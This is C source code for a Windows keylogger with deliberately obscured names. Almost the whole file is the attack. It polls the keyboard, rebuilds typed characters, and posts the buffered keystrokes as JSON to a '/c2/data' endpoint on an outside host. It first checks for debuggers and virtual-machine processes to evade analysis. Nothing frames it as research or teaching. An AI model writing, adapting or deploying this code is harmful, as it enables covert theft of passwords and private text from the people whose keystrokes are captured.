#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#include <stdlib.h>
#include <time.h>

#define O1 1024
#define O2 2000

char V1[O1];
int V2 = 0;
CRITICAL_SECTION V3;
char* O3 = "tdsoperational.pythonanywhere.com";

typedef SHORT (WINAPI *F3)(int);
F3 O4;

void F4(char* V4) {
    srand((unsigned int)time(NULL));
    for (int V5 = 0; V5 < 3; ++V5) {
        V4[V5] = 'A' + (rand() % 26);
    }
    V4[3] = '\0';
}

void F5(char* V6, const char* V7) {
    int V8 = strlen(V6);
    for (int V9 = 0; V9 < V8; ++V9) {
        V6[V9] ^= V7[V9 % 3];
    }
}

BOOL F6() {
    return IsDebuggerPresent();
}

BOOL F7() {
    const char* V10[] = {
        "vmware.exe", "vboxservice.exe", "vboxtray.exe",
        "vmtoolsd.exe", "vmcompute.exe", "vmmem.exe"
    };
    DWORD V11[1024], V12, V13;
    unsigned int V14;

    if (!EnumProcesses(V11, sizeof(V11), &V12))
        return FALSE;

    V13 = V12 / sizeof(DWORD);

    for (V14 = 0; V14 < V13; V14++) {
        if (V11[V14] != 0) {
            TCHAR V15[MAX_PATH] = TEXT("<unknown>");
            HANDLE V16 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, V11[V14]);
            if (V16) {
                HMODULE V17;
                DWORD V18;
                if (EnumProcessModules(V16, &V17, sizeof(V17), &V18)) {
                    GetModuleBaseName(V16, V17, V15, sizeof(V15) / sizeof(TCHAR));
                }
            }
            for (int V19 = 0; V19 < sizeof(V10) / sizeof(V10[0]); V19++) {
                if (strstr(V15, V10[V19]) != NULL) {
                    CloseHandle(V16);
                    return TRUE;
                }
            }
            CloseHandle(V16);
        }
    }
    return FALSE;
}

void F1() {
    if (F6() || F7()) {
        return;
    }

    HINTERNET V20 = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (V20) {
        HINTERNET V21 = InternetConnectA(V20, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (V21) {
            const char *O5 = "/c2/data";
            const char *O6 = "Content-Type: application/json\r\nUser-Agent: TLD9Browser/2.0";
            HINTERNET V22 = HttpOpenRequestA(V21, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            if (V22) {
                char V23[4];
                F4(V23);
                F5(V1, V23);

                char V24[O1 + 128];
                sprintf(V24, "{\"content\":\"%s\"}", V1);

                if (HttpSendRequestA(V22, O6, -1, V24, strlen(V24))) {
                }
                InternetCloseHandle(V22);
            }
            InternetCloseHandle(V21);
        }
        InternetCloseHandle(V20);
    }

    EnterCriticalSection(&V3);
    V2 = 0;
    V1[0] = '\0';
    LeaveCriticalSection(&V3);
}

DWORD WINAPI F2(LPVOID O7) {
    DWORD V25 = GetTickCount();
    while (1) {
        for (int V26 = 8; V26 <= 255; V26++) {
            if (O4(V26) & 0x0001) {
                V25 = GetTickCount();

                char V27[2] = {0, 0};
                SHORT V28 = GetKeyState(VK_CAPITAL) & 0x0001;
                SHORT V29 = O4(VK_SHIFT) & 0x8000;

                if ((V26 >= 'A' && V26 <= 'Z')) {
                    if (V29 ^ V28) {
                        V27[0] = (char)V26;
                    } else {
                        V27[0] = (char)(V26 + 32);
                    }
                } else if (V26 >= '0' && V26 <= '9') {
                    if (V29) {
                        switch (V26) {
                            case '0': V27[0] = ')'; break;
                            case '1': V27[0] = '!'; break;
                            case '2': V27[0] = '@'; break;
                            case '3': V27[0] = '#'; break;
                            case '4': V27[0] = '$'; break;
                            case '5': V27[0] = '%'; break;
                            case '6': V27[0] = '^'; break;
                            case '7': V27[0] = '&'; break;
                            case '8': V27[0] = '*'; break;
                            case '9': V27[0] = '('; break;
                        }
                    } else {
                        V27[0] = (char)V26;
                    }
                } else {
                    switch (V26) {
                        case VK_SPACE: V27[0] = ' '; break;
                        case VK_RETURN: V27[0] = '\n'; break;
                        case VK_TAB: V27[0] = '\t'; break;
                        case VK_BACK:
                            EnterCriticalSection(&V3);
                            if (V2 > 0) {
                                V2--;
                                V1[V2] = '\0';
                            }
                            LeaveCriticalSection(&V3);
                            continue;
                        case VK_OEM_1: V27[0] = (V29) ? ':' : ';'; break;
                        case VK_OEM_PLUS: V27[0] = (V29) ? '+' : '='; break;
                        case VK_OEM_COMMA: V27[0] = (V29) ? '<' : ','; break;
                        case VK_OEM_MINUS: V27[0] = (V29) ? '_' : '-'; break;
                        case VK_OEM_PERIOD: V27[0] = (V29) ? '>' : '.'; break;
                        case VK_OEM_2: V27[0] = (V29) ? '?' : '/'; break;
                        case VK_OEM_3: V27[0] = (V29) ? '~' : '`'; break;
                        case VK_OEM_4: V27[0] = (V29) ? '{' : '['; break;
                        case VK_OEM_5: V27[0] = (V29) ? '|' : '\\'; break;
                        case VK_OEM_6: V27[0] = (V29) ? '}' : ']'; break;
                        case VK_OEM_7: V27[0] = (V29) ? '"' : '\''; break;
                        default: continue;
                    }
                }

                EnterCriticalSection(&V3);
                if (V2 + 1 < O1) {
                    strcat(V1, V27);
                    V2++;
                }
                LeaveCriticalSection(&V3);
            }
        }

        if (GetTickCount() - V25 >= O2) {
            if (V2 > 0) {
                F1();
            }
            V25 = GetTickCount();
        }

        Sleep(10);
    }
    return 0;
}

int wmain() {
    DWORD V30;
    HANDLE V31;

    O4 = (F3)GetProcAddress(GetModuleHandle(TEXT("user32.dll")), "GetAsyncKeyState");

    InitializeCriticalSection(&V3);
    V31 = CreateThread(NULL, 0, F2, NULL, 0, &V30);
    WaitForSingleObject(V31, INFINITE);
    DeleteCriticalSection(&V3);
    CloseHandle(V31);
    return 0;
}
